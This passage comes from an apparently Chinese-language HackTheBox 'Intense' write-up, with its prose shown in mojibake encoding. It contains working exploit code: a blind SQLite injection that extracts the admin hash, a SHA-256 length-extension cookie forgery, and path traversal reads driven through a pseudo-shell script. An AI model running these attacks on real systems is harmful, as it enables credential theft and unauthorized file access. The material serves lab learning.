session[<span class="string">"secret"</span>])</span><br><span class="line">    <span class="keyword">return</span> user.role == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### Logs functions ####</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_view_log</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists(<span class="string">f"logs/<span class="subst">&#123;filename&#125;</span>"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f"Can't find <span class="subst">&#123;filename&#125;</span>"</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">f"logs/<span class="subst">&#123;filename&#125;</span>"</span>) <span class="keyword">as</span> out:</span><br><span class="line">        <span class="keyword">return</span> out.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_list_log</span><span class="params">(logdir)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> path.exists(<span class="string">f"logs/<span class="subst">&#123;logdir&#125;</span>"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f"Can't find <span class="subst">&#123;logdir&#125;</span>"</span></span><br><span class="line">    <span class="keyword">return</span> listdir(logdir)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªflaskæºç æ•´ä½“å®ç°äº†sqliteçš„æ•°æ®åº“æŸ¥è¯¢ã€‚åº“ä¸­æœ‰adminè´¦æˆ·ã€‚é€šè¿‡cookieæ¥åˆ¤æ–­admin.å¹¶ä¸”adminæœ‰è¯»æ–‡ä»¶è·Ÿåˆ—ç›®å½•çš„åŠŸèƒ½ã€‚</p><p>é¦–å…ˆä»utils.pyçœ‹èµ·ã€‚è¿™é‡Œçš„å‡½æ•°å…³äºsqliteæ‰§è¡Œéƒ¨åˆ†å‡åšäº†å ä½ç¬¦æŸ¥è¯¢ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ³¨å…¥é—®é¢˜ã€‚<code>def badword_in_str(data)</code>åšäº†å…³é”®å­—çš„ç­›é€‰ã€‚æˆ‘ä»¬å»åˆ°è°ƒç”¨å‡½æ•°çš„åœ°æ–¹,å¾ˆå®¹æ˜“å°±å‘ç°å¤„ç†çš„ä½ç½®<code>/submitmessage</code>å­˜åœ¨insert into å‹çš„sqlæ³¨å…¥ã€‚</p><p>æ³¨æ„æºç ä¸­è¿™é‡Œæ³¨å…¥çš„åœ°æ–¹è¿”å›å€¼æ˜¯ä¸¤ç§ï¼šâ€OKâ€æˆ–è€…æŠ¥é”™ã€‚å¾ˆå¿«å°±èƒ½ååº”è¿‡æ¥æ˜¯sqliteç›²æ³¨,å¹¶ä¸”æ˜¯ä½¿ç”¨æŠ¥é”™å‡½æ•°æ¥åŒºåˆ†å¸ƒå°”å€¼ã€‚</p><p>å…³äºsqliteçš„ç›²æ³¨,æ™®é€šçš„å¸ƒå°”ç›²æ³¨ä¸sqlæ³¨å…¥æ²¡ä»€ä¹ˆåŒºåˆ«ã€‚ä½†æ˜¯åœ¨sqlæ—¶é—´ç›²æ³¨çš„æƒ…å½¢ä¸‹å°±éœ€è¦å¦å¤–å¤„ç†ã€‚å› ä¸ºsqliteæ²¡æœ‰å»¶æ—¶å‡½æ•°,æ‰€ä»¥æƒ³è¦åŒºåˆ†åªèƒ½åˆ©ç”¨æŠ¥é”™ã€‚(è¿™ç‚¹åœ¨st98å¤§ä½¬å‡ºçš„sqlite_voting,å‰é˜µå­asisçš„adminpanelä¸­éƒ½å‡ºç°è¿‡) å¸¸ç”¨çš„æŠ¥é”™å‡½æ•°ä¹‹<code>RANDOMBLOB()</code>ä¸å¯ç”¨çš„è¯,è¿˜å¯ä»¥ç”¨<code>abs</code>,<code>json</code>ç­‰å‡½æ•°ã€‚</p><p>è¿™é‡Œç”¨abså‡½æ•°ç®€å•æ„é€ ä¸€ä¸ªdemo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">insert into messages values(&#39;1&#39;) union select abs(-9223372036854775808);</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">1&#39;) union select abs(case when (1&#x3D;1) then (-9223372036854775808) else 0 end) --</span><br></pre></td></tr></table></figure><p>æœ‰ä¸ªå°ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚ä¸çŸ¥é“æ˜¯ä¸æ˜¯insert intoè¯­å¥çš„é—®é¢˜,å¦‚æœæˆ‘ä»¬åˆ©ç”¨<code>abs(-9223372036854775808)</code>è¿™ä¸ªæ•´ä½“æ¥æ„é€ å¸ƒå°”å€¼çš„è¯ã€‚å½“è¯­å¥ä¸­å‡ºç°selectä¼šä¸€ç›´æŠ¥é”™ã€‚è€Œå¦‚æœæˆ‘ä»¬åˆ©ç”¨<code>-9223372036854775808</code>æ¥ä½œä¸ºçœŸå€¼çš„è¯åˆ™ä¸ä¼šå‡ºç°è¿™ä¸ªé—®é¢˜ã€‚</p><p>ç»¼ä¸Š,ä¸Šé¢è¿™éƒ¨åˆ†å¾ˆå¿«å°±èƒ½ç¼–å†™exp.æœ¬åœ°è·‘çš„è¯,å…ˆå†™ä¸ªsql<br><img src="/2020/07/22/hackthebox-Intense/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å› ä¸ºé¢˜ç›®æºç ä¸­å¾ˆæ˜ç¡®çš„å‡ºç°äº†å‡ ä¸ªåˆ—åï¼Œæ‰€ä»¥å¯ä»¥å¿«é€Ÿç¼–å†™å¹¶åˆ›å»ºæœ¬åœ°çš„db.<br>è¿œç¨‹è·‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">URL =<span class="string">"http://10.10.10.195"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65</span>):</span><br><span class="line">    a=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">        print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">        payload = <span class="string">"a') union select abs(case when (substr((select password from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">        data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">        r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            a=<span class="number">1</span></span><br><span class="line">            flag += j</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"\r"</span>)</span><br><span class="line"><span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><p>å¾—åˆ°hash<br><code>f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105</code></p><p>æ‹¿åˆ°hashåå°è¯•è§£æ—¶æœç„¶æ²¡æœ‰å¾—åˆ°æ˜æ–‡ã€‚çœ‹æ¥å¦æœ‰ç„æœºã€‚æ³¨æ„åˆ° lwt.pyä¸­ä¸€ä¸ªå¾ˆæ˜¾çœ¼çš„éƒ¨åˆ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SECRET = os.urandom(randrange(<span class="number">8</span>, <span class="number">15</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="string">""" Sign message with secret key """</span></span><br><span class="line">    <span class="keyword">return</span> sha256(SECRET + msg).digest()</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä½œä¸ºç›å€¼çš„SECRETå¤„äºhashç®—æ³•sha256çš„å‰ç«¯ã€‚è¿™è¯´æ˜æ˜¯å­˜åœ¨hashæ‰©å±•æ”»å‡»çš„ã€‚æˆ‘ä»¬ä»”ç»†çœ‹ä¸‹å…¶è°ƒç”¨ä½ç½®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_session</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    <span class="string">""" Parse cookie and return dict</span></span><br><span class="line"><span class="string">        @cookie: "key1=value1;key2=value2"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        return &#123;"key1":"value1","key2":"value2"&#125;</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    b64_data, b64_sig = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">    data = b64decode(b64_data)</span><br><span class="line">    sig = b64decode(b64_sig)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> verif_signature(data, sig):</span><br><span class="line">        <span class="keyword">raise</span> InvalidSignature</span><br><span class="line">    info = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> group <span class="keyword">in</span> data.split(<span class="string">b';'</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> group:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            key, val = group.split(<span class="string">b'='</span>)</span><br><span class="line">            info[key.decode()] = val</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> info</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å‘ç°ã€‚å®ƒå–cookieä¸­ç”±<code>.</code>åˆ†å‰²å¼€çš„ä¸¤éƒ¨åˆ†åˆ†åˆ«ä½œä¸ºdataä¸sign.å…¶ä¸­dataæ˜¯<code>username=guest;secret=SHA256{guest}</code>çš„base64æ•°æ®ã€‚ä»è¿™é‡Œçš„å–é”®å€¼è¿”å›infoçš„å‡½æ•°å¾ˆå¿«å°±èƒ½å‘ç°å­˜åœ¨å˜é‡è¦†ç›–ã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨åŸå§‹æ•°æ®åæ·»åŠ <code>username=admin;secret=xxx</code>å°±èƒ½è¦†ç›–åŸå…ˆcookieä¸­usernameä¸secretçš„å€¼ã€‚è€Œè¿™æ­£æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»èƒ½åšåˆ°çš„ï¼šåœ¨åŸæœ‰æ•°æ®ä¸Šæ·»åŠ æ–°çš„æ•°æ®ã€‚</p><p>é‚£ä¹ˆå›è¿‡å¤´æ¥çœ‹ä¸‹å®ƒæ˜¯å¦‚ä½•åˆ¤æ–­adminçš„ã€‚å‘ç°æœç„¶æ˜¯ä»cookieä¸­å–adminä¸secretä¸æ•°æ®åº“ä¸­çš„usernameä¸secretè¿›è¡Œæ¯”è¾ƒã€‚è¿”å›å…¶roleå€¼ã€‚ä¸º1å³admin.</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯hashé•¿åº¦æ‰©å±•æ”»å‡»äº†,ç”±äºSECRETé•¿åº¦æœ‰èŒƒå›´,æ‰€ä»¥éœ€è¦å°èŒƒå›´å°è¯•ä¸€ä¸‹ã€‚å¹¶ä¸”ä½¿ç”¨hashpumpyæ·»åŠ æ•°æ®<code>;username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;</code>ä¹‹æ‰€ä»¥è¿˜è¦åŠ ä¸ªåˆ†å·æ˜¯å› ä¸ºæˆ‘ä»¬çš„é•¿åº¦æ‰©å±•æ”»å‡»ä¼šåœ¨åŸå§‹æ•°æ®åæ·»åŠ <code>\x00</code>ä¹‹ç±»çš„æ•°æ®ã€‚è€Œ<code>parse_session</code>å‡½æ•°æ˜¯æŒ‰åˆ†å·è¯†åˆ«é”®,å€¼çš„ã€‚éœ€è¦å¦åŠ ä¸€ä¸ªåˆ†å·é¿å…åé¢çš„usernameé”®åå¸¦ä¸Šå‰é¢çš„æ•°æ®ã€‚</p><p>å› ä¸ºè¦åšåˆ°åˆ—ç›®å½•ï¼Œè¯»æ–‡ä»¶ï¼Œè‚¯å®šå¾—é‡å¤è°ƒç”¨ã€‚äºæ˜¯æ‰“ç®—å°è¯•ä¸‹å†™å®Œæ•´çš„åˆ©ç”¨è„šæœ¬æ¥æ¨¡æ‹Ÿå‘½ä»¤è¡Œæ¨¡å¼,æ€»å½’æ˜¯å†™å‡ºæ¥äº†ã€‚è™½ç„¶æˆ‘è§‰å¾—æ•ˆæœä¸€èˆ¬èˆ¬,ä½†æ¯•ç«Ÿæ˜¯ç¬¬ä¸€æ¬¡å†™æ¯”è¾ƒå®Œæ•´çš„åˆ©ç”¨,å¿ƒé‡Œè¿˜æ˜¯æ¯”è¾ƒèˆ’é€‚çš„233.</p><p>å› ä¸ºsqlæ³¨å…¥éƒ¨åˆ†æœ¬åœ°åªè¦10sä¸åˆ°ã€‚è¿œç¨‹è¦10åˆ†é’Ÿå¤šã€‚æ‰€ä»¥ç‰¹æ„åŠ äº†defaulté€‰é¡¹å¯ä»¥ç›´æ¥ä½¿ç”¨ç°æˆçš„ç”¨æˆ·åè·Ÿhash.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py default</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashpumpy <span class="keyword">import</span> hashpump</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> cmd <span class="keyword">import</span> Cmd</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">'ignore'</span>)</span><br><span class="line"></span><br><span class="line">URL=<span class="string">'http://10.10.10.195/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">guest_cred=<span class="string">""</span></span><br><span class="line">admin_cookie=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">terminal</span><span class="params">(Cmd)</span>:</span></span><br><span class="line">    <span class="comment">#prompt = "[*] =&gt; "</span></span><br><span class="line">    prompt=<span class="string">'\033[1;31;40m[*]\033[0m'</span>+<span class="string">' =&gt; '</span>+<span class="string">'\033[0;34;40m /var/www/html/app&gt; \033[0m'</span></span><br><span class="line">    print(<span class="string">"[*] prompting a shell(current directory /var/www/html/app)"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">default</span><span class="params">(self, line)</span>:</span></span><br><span class="line">        command=line.split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(admin_command(command[<span class="number">0</span>],command[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_name</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] getting admin username:"</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">            payload = <span class="string">"a') union select abs(case when (substr((select username from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">            data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">            r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                flag += j</span><br><span class="line">                print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_hash</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] getting admin hash:"</span>+<span class="string">"\r"</span>)</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">64</span> + <span class="number">1</span>):</span><br><span class="line">        a=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:</span><br><span class="line">            print(<span class="string">"\r"</span> + flag, flush=<span class="literal">False</span>, end=<span class="string">''</span>)</span><br><span class="line">            payload = <span class="string">"a') union select abs(case when (substr((select secret from users limit 0,1),"</span> + str(i) + <span class="string">",1)='"</span> + j + <span class="string">"') then(-9223372036854775808) else 0 end )--"</span></span><br><span class="line">            data = &#123;<span class="string">'message'</span>: payload&#125;</span><br><span class="line">            r = requests.post(URL + <span class="string">'submitmessage'</span>, data=data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'overflow'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                a=<span class="number">1</span></span><br><span class="line">                flag += j</span><br><span class="line">                print(<span class="string">"\r"</span> + flag, flush=<span class="literal">True</span>, end=<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guest_login</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[*] login with guest:guest"</span>+<span class="string">"\r"</span>)</span><br><span class="line">    <span class="keyword">global</span> guest_cred</span><br><span class="line">    users=&#123;<span class="string">'username'</span>:<span class="string">"guest"</span>,<span class="string">"password"</span>:<span class="string">"guest"</span>&#125;</span><br><span class="line">    r=requests.post(URL+<span class="string">'postlogin'</span>,data=users)</span><br><span class="line">    old_data,old_sig=r.cookies[<span class="string">'auth'</span>].split(<span class="string">'.'</span>)</span><br><span class="line">    guest_cred=b64decode(old_data).decode()</span><br><span class="line">    <span class="keyword">return</span> b64decode(old_sig).hex()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crafting_payload</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> DEFAULT!=<span class="literal">True</span>:          </span><br><span class="line">        <span class="comment">#from scratch</span></span><br><span class="line">        admin_name=get_admin_name()</span><br><span class="line">        admin_hash=get_admin_hash()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#default</span></span><br><span class="line">        admin_name=<span class="string">"admin"</span></span><br><span class="line">        admin_hash=<span class="string">"f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105"</span></span><br><span class="line">    old_sig = guest_login()</span><br><span class="line">    old_data=guest_cred</span><br><span class="line">    payload=<span class="string">';'</span>+(<span class="string">";"</span>.join([<span class="string">"username="</span>+admin_name,<span class="string">"secret="</span>+admin_hash]))+<span class="string">";"</span></span><br><span class="line">    new_sig=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">15</span>):</span><br><span class="line">        res = hashpump(old_sig, old_data, payload,length)</span><br><span class="line">        cookie=(b64encode(res[<span class="number">1</span>])+<span class="string">b'.'</span>+b64encode(bytes.fromhex(res[<span class="number">0</span>]))).decode()</span><br><span class="line">        <span class="keyword">if</span> admin_login(cookie):</span><br><span class="line">            print(<span class="string">'[*] testing length '</span>+str(length)+<span class="string">" : "</span>)</span><br><span class="line">            print(<span class="string">'[*] admin_cookie: '</span>+ cookie)</span><br><span class="line">            <span class="keyword">return</span> cookie</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"[*] Failes getting proper cookie."</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_login</span><span class="params">(cookie)</span>:</span></span><br><span class="line">    cookies=&#123;<span class="string">"auth"</span>:cookie&#125;</span><br><span class="line">    r=requests.get(URL+<span class="string">'admin'</span>,cookies=cookies)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">403</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_command</span><span class="params">(option,command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> option <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">'dir'</span>,<span class="string">'view'</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Only dir/view supported."</span></span><br><span class="line">    <span class="keyword">elif</span> option==<span class="string">'dir'</span>:</span><br><span class="line">        r=requests.post(URL+<span class="string">'admin/log/dir'</span>,data=&#123;<span class="string">'logdir'</span>:command&#125;,cookies=admin_cookie)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = requests.post(URL + <span class="string">'admin/log/view'</span>, data=&#123;<span class="string">'logfile'</span>: <span class="string">'../'</span>+command&#125;,cookies=admin_cookie)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">'default'</span>:</span><br><span class="line">            print(<span class="string">"[*] use default username + password"</span>)</span><br><span class="line">            DEFAULT=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit(<span class="string">"[*] specify default flag"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        DEFAULT=<span class="literal">False</span></span><br><span class="line">    admin_cookie[<span class="string">'auth'</span>]=crafting_payload()</span><br><span class="line">    terminal().cmdloop()</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚å›¾:<br><img src="/2020/07/22/hackthebox-Intense/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¤§è‡´åŠŸèƒ½:è·‘èµ·æ¥å°±èƒ½å¾—åˆ°adminè·Ÿhash;çˆ†ç ´å‡ºadminçš„cookie;æ”¯æŒå‡å‘½ä»¤è¡Œ<code>dir</code>è·Ÿ<code>view</code>å‘½ä»¤åˆ†åˆ«ç”¨æ¥åˆ—ç›®å½•è·Ÿè¯»æ–‡ä»¶ã€‚</p><p>è¿™æ ·å°±èƒ½å¾ˆå¿«åœ¨<code>/home/user</code>ä¸‹æ‰¾åˆ°user.txtè¯»å–äº†ã€‚</p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æˆ‘è§‰å¾—éš¾åº¦ä¸€èˆ¬ã€‚æ‹¿åˆ°CTFä¸­å€’æ˜¯æŒºåˆé€‚çš„ã€‚ä¸è¿‡æˆ‘è§‰å¾—è¿™ä¸ªhashé•¿åº¦æ‰©å±•ä»¥åŠå‰é¢æ³¨å…¥æ—¶è¸©çš„ä¸èƒ½ç”¨å®Œæ•´çš„<code>abs()</code>çš„å‘ç®—æ˜¯ç»™è‡ªå·±ä¸€äº›æé†’ã€‚</p><h2 id="privesc-to-shell"><a href="#privesc-to-shell" class="headerlink" title="privesc to shell"></a>privesc to shell</h2><p>  